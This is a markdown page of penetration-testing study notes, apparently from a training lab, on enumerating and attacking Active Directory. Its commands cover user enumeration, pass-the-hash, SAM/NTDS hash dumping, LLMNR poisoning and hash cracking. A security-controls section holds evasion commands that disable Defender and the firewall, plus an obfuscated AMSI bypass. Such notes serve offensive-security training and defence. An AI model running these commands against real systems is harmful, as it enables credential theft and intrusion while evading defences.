---
title: Active Directory - Enumeration
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - windows
---


# Enumerating Active Directory

**Tool for enumeration**: 

- [Enumeration with LDAP queries](389-636-ldap.md)
- [PowerView.ps1 from PowerSploit project (powershell)](powerview.md).
- [The ActiveDirectory PowerShell module (powershell)](activedirectory-powershell-module.md).
- [BloodHound (C# and PowerShell Collectors)](bloodhound.md).
- [SharpView (C#)](sharpview.md).
- [kerbrute](kerbrute.md).
- [Crackmapexec](crackmapexec.md).
- [enum4linux](enum4linux.md).
- net.exe.
- [powershell](powershell.md).
- [ActiveDirectory PowerShell Module](activedirectory-powershell-module.md).


## 1. Users

### From Windows

#### Kerbrute

[See kerbrute](kerbrute.md).

 It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.


```
sudo git clone https://github.com/ropnop/kerbrute.git

# Typing make help will show us the compiling options available.
cd kerbrute
make help

# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
sudo make all

# The newly created dist directory will contain our compiled binaries.
ls -la dist

# Copy the file to the windows pivoting machine
scp kerbrute_windows_amd64.exe username@$ip:~/
```

```
kerbrute_windows_amd64.exe userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
# d: domain
# --dc: domain controller
# -o: output file
```

#### powershell

[See powershell](powershell.md)

```powershell
# Prints all the information about the system
systeminfo

# Prints the PC's Name
hostname

# Am I alone
qwinsta

# Display Powershell relevant Powershell version information
echo $PSVersion
echo $PSVersionTable

# Prints out the OS version and revision level
[System.Environment]::OSVersion.Version	

# Prints the patches and hotfixes applied to the host
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Displays a list of environment variables for the current session (ran from CMD-prompt)
set	

# Return environment values such as key paths, users, computer information, etc.
Get-ChildItem Env: | ft Key,Value	

# Displays the domain name to which the host belongs (ran from CMD-prompt)
echo %USERDOMAIN%	

# Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
echo %logonserver%	

#You can tell if PowerShell is running with administrator privileges (a.k.a “elevated” rights) with the following snippet:
[Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'

# Retrieves the WindowsIdentity for the currently running user.
[Security.Principal.WindowsIdentity]::GetCurrent() 

# Access the groups property of the identity to find out what user groups the identity is a member of.
[Security.Principal.WindowsIdentity]::GetCurrent()(...).groups

# It returns true if groups contains the Well Known SID of the Administrators group (the identity will only contain it if “run as administrator” was used) and otherwise false.
[Security.Principal.WindowsIdentity]::GetCurrent() -contains "S-1-5-32-544" 

# List disabled users with LDAP
Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name

```

Net commands in powershell:

```powershell
# Information about domain groups
net group /domain	

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "domain computers" /domain	

# List PC accounts of domains controllers
net group "Domain Controllers" /domain	

# User that belongs to the group
net group <domain_group_name> /domain	

# List of domain groups
net groups /domain	

# All available groups
net localgroup	

# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup administrators /domain	

# Information about a group (admins)
net localgroup Administrators	

# Add user to administrators
net localgroup administrators [username] /add	


# Get information about a user within the domain
net user <ACCOUNT_NAME> /domain	

# List all users of the domain
net user /domain	

# Information about the current user
net user %username%	
	
```


#### Windows Management Instrumentation (WMI)

```powershell
#Displays information about all local accounts and any domain accounts that have logged into the device
wmic useraccount list /format:list	

# Information about all local groups
wmic group list /format:list	

# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list	
```


#### ActiveDirectory PowerShell module

[See more at ActiveDirectory PowerShell module.](activedirectory-powershell-module.md)

**Get-ADDomain**: We'll enumerate some basic information about the domain with the Get-ADDomain cmdlet.

```powershell
# This will print out helpful information like the domain SID, domain functional level, any child domains, and more.
Get-ADDomain
```

**Get-ADUser**: [More on https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps).  

```powershell
# This command gets all users in the container OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM.
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM"

# This command gets all users that have a name that ends with SvcAccount:
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A

# This command gets all of the properties of the user with the SAM account name ChewDavid:
Get-ADUser -Identity ChewDavid -Properties *

# This command gets the user with the name ChewDavid in the Active Directory Lightweight Directory Services (AD LDS) instance:
Get-ADUser -Filter "Name -eq 'ChewDavid'" -SearchBase "DC=AppNC" -Properties "mail" -Server lds.Fabrikam.com:50000

# This command gets all enabled user accounts in Active Directory using an LDAP filter: meaning to return all disabled accounts
Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'

# search for all administrative users with the `DoesNotRequirePreAuth` attribute set, meaning that they can be ASREPRoasted:
Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}



# Find all administrative users with the SPN "servicePrincipalName" attribute set, meaning that they can likely be subject to a Kerberoasting attack
Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl

# Another way to retrieve Service Principals
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

```

**Get-ADComputer**: 

```powershell
# Search domain computers for interesting hostnames. SQL servers are a particularly juicy target on internal assessments. The below command searches all hosts in the domain using `Get-ADComputer`, filtering on the `DNSHostName` property that contains the word `SQL`
Get-ADComputer  -Filter "DNSHostName -like 'SQL*'"
```

**Get-ADGroup**:

```powershell
# Group enumeration
Get-ADGroup -Filter * | select name

# Get detailed information about a group
Get-ADGroup -Identity "Backup Operators"

# Search for administrative groups by filtering on the `adminCount` attribute. If set to `1`, it's protected by AdminSDHolder and known as protected groups. `AdminSDHolder` is owned by the Domain Admins group. It has the privileges to change the permissions of objects in Active Directory. 
Get-ADGroup -Filter "adminCount -eq 1" | select Name
```

**Get-ADGroupMember**:

```powershell
# Returns members of a group
Get-ADGroupMember -Identity "Backup Operators"
```

**Get-ADTrust**: Verify domain trust relationships using the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet. This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful  on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. 

```powershell
Get-ADTrust -Filter *
```

#### PowerView
[See more at Powerview](powerview.md).


**Module: ActiveDirectory**

```powershell
########################
# Domain/LDAP Functions
########################

# Returns the AD object for the current (or specified) domain
Get-Domain	

# Return a list of the Domain Controllers for the specified domain
Get-DomainController	

# Returns all users or specific user objects in AD
Get-DomainUser	
# Example: 
# Get-DomainUser -Identity $username -Domain $domain | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Checks for users with the SPN attribute set
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Returns all computers or specific computer objects in AD
Get-DomainComputer	

# Returns all groups or specific group objects in AD
Get-DomainGroup	

# Searches for all or specific OU objects in AD
Get-DomainOU

# Finds object ACLs in the domain with modification rights set to non-built in objects
Find-InterestingDomainAcl	

# Returns the members of a specific domain group
Get-DomainGroupMember	
# Example: 
# Get-DomainGroupMember -Identity "Domain Admins" -Recurse
# Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) 

# Returns a list of servers likely functioning as file servers
Get-DomainFileServer	

# Returns a list of all distributed file systems for the current (or specified) domain
Get-DomainDFSShare	


########################
# GPO Functions
########################
# Returns all GPOs or specific GPO objects in AD
Get-DomainGPO	

# Returns the default domain policy or the domain controller policy for the current domain
Get-DomainPolicy	


########################
# Computer Enumeration Functions
########################
# Enumerates local groups on the local or a remote machine
Get-NetLocalGroup

# Enumerates members of a specific local group
Get-NetLocalGroupMember	

# Returns open shares on the local (or a remote) machine
Get-NetShare	

# Returns session information for the local (or a remote) machine
Get-NetSession	

# Tests if the current user has administrative access to the local (or a remote) machine
Test-AdminAccess	
# Example: 
# Test-AdminAccess -ComputerName ACADEMY-EA-MS01


########################
# Threaded 'Meta'-Functions:
########################
# Finds machines where specific users are logged in
Find-DomainUserLocation	

# Finds reachable shares on domain machines
Find-DomainShare	

# Searches for files matching specific criteria on readable shares in the domain
Find-InterestingDomainShareFile	

# Finds machines on the local domain where the current user has local administrator access
Find-LocalAdminAccess	


########################
# Domain Trust Functions:
########################
# Returns domain trusts for the current domain or a specified domain
Get-DomainTrust	

# Returns all forest trusts for the current forest or a specified forest
Get-ForestTrust	

# Enumerates users who are in groups outside of the user's domain
Get-DomainForeignUser	

# Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainForeignGroupMember	

# Enumerates all trusts for the current domain and any others seen.
Get-DomainTrustMapping	
```


```powershell
# Gets the ID for the current Domain (useful later for crafting Golden tickets)
Get-DomainID

# Displays policies for the Domain and accounts, including for instance LockoutBadAccounts
Get-DomainPolicy

# Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Get-DomainSPNTicket
```


#### SharpView

[More about SharpView](sharpview.md).


Download github repo from: [https://github.com/tevora-threat/SharpView/](https://github.com/tevora-threat/SharpView/).


```powershell
# Obtain help about a command
\SharpView.exe Get-DomainUser -Help

# Get information about a given user
.\SharpView.exe Get-DomainUser -Identity $username
```

### From Linux


#### Kerbrute

[See kerbrute](kerbrute.md).

 It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.
 This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for.

**How it works?**

Basically, the tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid.

*This method of username enumeration does not cause logon failures and will not lock out accounts.*


```
sudo git clone https://github.com/ropnop/kerbrute.git

# Typing make help will show us the compiling options available.
cd kerbrute
make help

# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
sudo make all

# The newly created dist directory will contain our compiled binaries.
ls -la dist

# Add the tool to our PATH to make it accessible from anywhere in the host. For that we make sure first of the PATH
echo $PATH

# and then we move the binary to a path, for instance
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
# d: domain
# --dc: domain controller
# -o: output file
```

**However**, using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768).  Defenders can tune their SIEM tools to look for an influx of this event ID.

#### crackmapexec

[CrackMapExec](crackmapexec.md):

```shell-session
# This is a useful tool that will also show the badpwdcount
crackmapexec smb $ip --users

# Also, if we have valid credentials, we could extract the users with the flag --users
sudo crackmapexec smb $ip -u $username -p $password --users
```

As a matter of fact, if we have a foothold on the domain, we could perform the following enumeration:

```powershell
# Check if we can access a machine
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN>

# Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)
crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>

# Enumerate active sessions
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --sessions


# Get sam: extract hashes from all users authenticated in the machine 
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sam

# Get the ntds.dit, given that your user has permissions
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --ntds

# Check which machines we can access in a subnet
crackmapexec smb $ip/24 -u <username> -p <password> -d <DOMAIN>

# Enumerate logged on users in other hosts of the domain
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --loggedon-users

# Enumerate users of the domain
sudo crackmapexec smb  $ip -u <username> -p <password> -d <DOMAIN> --users

crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --users

# Enumerate groups of the domain
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --groups

```

#### rpcclient

[rpcclient](rpcclient.md) and the  SMB NULL session technique:

```shell-session
# Connect to a remote shared folder (same as smbclient in this regard)
rpcclient -U "" -N $ip

# Enumerate all domains that are deployed in the network 
enumdomains

# Provides domain, server, and user information of deployed domains.
querydominfo

# Enumerates all domain users.
enumdomusers
```


#### enum4linux

[enum4linux](enum4linux.md) 

```
# Enumerate users
enum4linux -U $ip  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

```


#### ldap 

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

##### ldapsearch

```shell-session
ldapsearch -h $ip -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

```

Other tools related to ldap: `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`.

#####  windapsearch

[See more at windapsearch.](windapsearch.md)


```shell-session
# Enumerate Users
./windapsearch.py -d $domain -u $username\\ldapbind -p $password -U
# -U: returns only USERS
# -u: specifies username. "" for blank
# -p: indicates password
# -d: indicates domain

# Enumerate users with no user foothold
./windapsearch.py --dc-ip $ip -u "" -U
# -u: specifies username. "" for blank
# -U: returns only USERS

# Enumerate Domain Admins
./windapsearch.py --dc-ip $ip -u $username@$domain -p $password --da
./windapsearch.py -d $domain -u $username\\ldapbind -p $password --da
# --da: returns only Domain admins
# -u: specifies username. "" for blank
# -p: indicates password
# -d: indicates domain
# Example:
# python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Enumerating Computers
./windapsearch.py -d $domain -u $username\\ldapbind -p $password -C -r
# -r or --resolve option: the tool will perform a DNS lookup on every enumerated dNSHostName found and output the computer information, including IP address in CSV format. 
# -C: list all matching entries where objectClass=Computer

# Custom Search 
./windapsearch.py -d $domain -u $username\\ldapbind -p $password -s Lalala
# -s: search everywhere the term, in this case Lalala.

# Enumerate Privilege Users with -PU
python3 windapsearch.py --dc-ip $ip -u $username@$domain -p $password -PU
```


## 2. Credentials 

### From Windows

#### LLMNR/NBT-NS Poisoning with Inveigh

[See Inveigh](inveigh.md).

LLMNR & NBT-NS poisoning is possible from a Windows host as well.  Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

**Powershell version**: The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section).

```
# Install the module
Import-Module .\Inveigh.ps1

# List parameters
(Get-Command Invoke-Inveigh).Parameters


# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```


**C#  version**:  Before we can use the C# version of the tool, we have to compile the executable. After that we can run:

```powershell
.\Inveigh.exe
```


Results:

```powershell
[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]

```


- `[+]`  default option and enabled by default
- `[ ]`  disabled options 

**Console access:** Press ESC to enter/exit interactive console. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.

```powershell-session
# List commands
> HELP

# view unique captured hashes
>  GET NTLMV2UNIQUE

#  see which usernames we have collected.
GET NTLMV2USERNAMES
```


Mitigations:  To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS.

- We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
- NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.
- NBT-NS can also be disabled

	- by creating a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following: 

```powershell
regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

	- Double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. 
	- Reboot the target system or restart the network adapter.


>To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as: `\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
>
>Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.


Some detection methods: [https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) 


### From Linux

#### LLMNR/NBT-NS Poisoning

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.

If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.

It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

Listening with responder

```bash
sudo responder -I ens224 -A -wf
# sudo privileges or root to make sure that all ports needed are available on our attack host for it to function best.
# -w: The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.
# -f: attempts to fingerprint the remote host operating system and version.
```

With this configuration shown above, Responder will listen and answer any requests it sees on the wire.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). 

**NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash**, meaning we have to attempt to crack them offline with [hashcat](hashcat.md) or [johntheripper](john-the-ripper.md). For example, in the case of a  NetNTLMv2 hash, we can copy the hash to a file and attempt to crack it using the hashcat module 5600. 

```shell-session
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

[See hashcat for other modules beside 5600](hashcat.md).

> Hashes are also stored in a SQLite database that can be configured in the `Responder.conf` config file, typically located in `/usr/share/responder` unless we clone the Responder repo directly from GitHub.



## 3. Password policy 

### From Windows

Some tools work for this end: `net.exe`, PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

##### net.exe

```cmd-session
net accounts
```

##### PowerView

Blocked by Microsoft Defender. 
PowerView gave us the same output as our net accounts command, just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).

```powershell-session
import-module .\PowerView.ps1

Get-DomainPolicy
```

##### Windows Management Instrumentation (`WMI`)

```powershell
# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list	
```

##### Powershell

[The net.exe commands](powershell.md): 

```powershell
# Information about password requirements
net accounts	

# Password and lockout policy
net accounts /domain

# Information about the current user
net user %username%	
```

### From Linux


The password policy can also be obtained remotely with:

#### crackmapexec

[CrackMapExec](crackmapexec.md):

```shell-session
# Obtain the password policy
crackmapexec smb $ip -u <username> -p <password> --pass-pol
```


#### rpcclient

[rpcclient](rpcclient.md) and the  SMB NULL session technique:

```shell-session
rpcclient -U "" -N $ip

rpcclient $> querydominfo
```


#### enum4linux

- [enum4linux](enum4linux.md) 

```shell-session
enum4linux -P $ip

enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

- [enum4linux-ng](enum4linux.md) 

```shell-session
enum4linux-ng.py -P <target> -oA ilfreight

# Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.
cat ilfreight.json 
```

#### Net

With net use:

```cmd-session
# Establish a null session from windows
net use \\DC01\ipc$ "" /u:""

# use a username/password combination to attempt to connect
net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.
# Error: Account is Disabled

net use \\DC01\ipc$ "password" /u:guest
# System error 1326 has occurred.
# The user name or password is incorrect.

net use \\DC01\ipc$ "password" /u:guest
# System error 1909 has occurred.
# The referenced account is currently locked out and may not be logged on to.
```


#### ldap 

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

```shell-session
ldapsearch -h $ip -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Other tools related to ldap: `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`.



## 4. Networks

### From Windows

#### Powershell and net commands

[See powershell](powershell.md).

```powershell
# Lists all known hosts stored in the arp table.
arp -a

# Prints out adapter settings for the host. We can figure out the network segment from here.
ipconfig /all	

# Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
route print

# Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
netsh advfirewall show allprofiles
```


**Evasion trick**: If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string. [The net.exe commands](powershell.md): 

```powershell
# Information about password requirements
net accounts	

# Password and lockout policy
net accounts /domain

# Information about domain groups
net group /domain	

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "domain computers" /domain	

# List PC accounts of domains controllers
net group "Domain Controllers" /domain	

# User that belongs to the group
net group <domain_group_name> /domain	

# List of domain groups
net groups /domain	

# All available groups
net localgroup	

# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup administrators /domain	

# Information about a group (admins)
net localgroup Administrators	

# Add user to administrators
net localgroup administrators [username] /add	

# Check current shares
net share	

# Get information about a user within the domain
net user <ACCOUNT_NAME> /domain	

# List all users of the domain
net user /domain	

# Information about the current user
net user %username%	

# Mount the share locally
net use x: \computer\share	

# Get a list of computers
net view	

# 	Shares on the domains
net view /all /domain[:domainname]

# List shares of a computer
net view \computer /ALL	

# List of PCs of the domain
net view /domain	
```





## 5. Security controls 

### From Windows

**cmd**

```cmd
# Check if Windows Defender is running (from CMD.exe). 
sc query windefend
```

#### Powershell
[See powershell](powershell.md).

**Policies and antivirus**

```powershell
# Lists available modules loaded for use.
Get-Module	

#  print the execution policy settings for each scope on a host.
Get-ExecutionPolicy -List	

#This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
Set-ExecutionPolicy Bypass -Scope Process	
```

 [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.

```powershell
# Enumerate AppLocker policies 
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# If we find that a file cannot be run from a location, maybe we can try to run it from another location.

# Quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
$ExecutionContext.SessionState.LanguageMode

# Check current execution policy. If the answer is
# - "Restricted": Ps scripts cannot run.
# - "RemoteSigned": Downloaded scripts will require the script to be signed by a trusted publisher.
Get-Execution-Policy

# Bypass execution policy
powershell -ep bypass

# Get the current Defender status.
Get-MpComputerStatus

# Deactivate antivirus from powershell session (if user has rights to do so)
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable firewall
netsh advfirewall set allprofiles state off

# Bypass AMSI
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Add a registry
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) is a powershell functions that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). It includes finding groups specifically delegated by sysadmins, finding users with "All Extended Rights" that can view passwords, and viewing all computers with LAPS enabled. 

An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.

```powershell
# Search for computers that have LAPS enabled when passwords expire
Get-LAPSComputers

# Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute
Find-LAPSDelegatedGroups

# Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute, meaning Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups
Find-AdmPwdExtendedRights
```

#### WMI

See [Windows Management Instrumentation (`WMI`)](135-windows-management-instrumentation-wmi.md).

```powershell
# Prints the patch level and description of the Hotfixes applied
wmic qfe get Caption,Description,HotFixID,InstalledOn	

# Displays basic host information to include any attributes within the list
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	

# A listing of all processes on host
wmic process list /format:list	

# Displays information about the Domain and Domain Controllers
wmic ntdomain list /format:list	

#Displays information about all local accounts and any domain accounts that have logged into the device
wmic useraccount list /format:list	

# Information about all local groups
wmic group list /format:list	

# Dumps information about any system accounts that are being used as service accounts.
wmic sysaccount list /format:list	
```


[See the net.exe commands in powershell](powershell.md):

```powershell
# Information about password requirements
net accounts	

# Password and lockout policy
net accounts /domain

# Information about domain groups
net group /domain	

# List users with domain admin privileges
net group "Domain Admins" /domain

# List of PCs connected to the domain
net group "domain computers" /domain	

# List PC accounts of domains controllers
net group "Domain Controllers" /domain	

# User that belongs to the group
net group <domain_group_name> /domain	

# List of domain groups
net groups /domain	

# All available groups
net localgroup	

# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup administrators /domain	

# Information about a group (admins)
net localgroup Administrators	

# Add user to administrators
